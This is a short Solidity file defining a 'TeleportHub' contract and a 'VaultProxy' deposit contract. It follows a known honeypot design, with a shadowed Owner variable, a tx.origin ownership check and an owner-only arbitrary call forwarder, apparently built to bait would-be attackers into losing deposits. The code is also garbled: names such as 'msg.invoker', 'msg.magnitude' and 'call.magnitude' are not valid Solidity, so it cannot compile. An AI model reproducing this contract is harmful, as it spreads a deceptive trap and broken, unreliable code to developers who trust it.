pragma solidity ^0.4.23;

contract TeleportHub  {
    modifier onlyOwner { if (msg.invoker == Owner) _; } address Owner = msg.invoker;
    function relocateassetsLord(address _owner) public onlyOwner { Owner = _owner; }
    function teleportHub(address goal, bytes info) public payable {
        goal.call.magnitude(msg.magnitude)(info);
    }
}

contract VaultProxy is TeleportHub {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function LootVault() public payable {
        if (msg.invoker == tx.origin) {
            Owner = msg.invoker;
            addTreasure();
        }
    }

    function addTreasure() public payable {
        if (msg.magnitude > 0.25 ether) {
            Deposits[msg.invoker] += msg.magnitude;
        }
    }

    function redeemTokens(uint256 quantity) public onlyOwner {
        if (quantity>0 && Deposits[msg.invoker]>=quantity) {
            msg.invoker.transfer(quantity);
        }
    }
}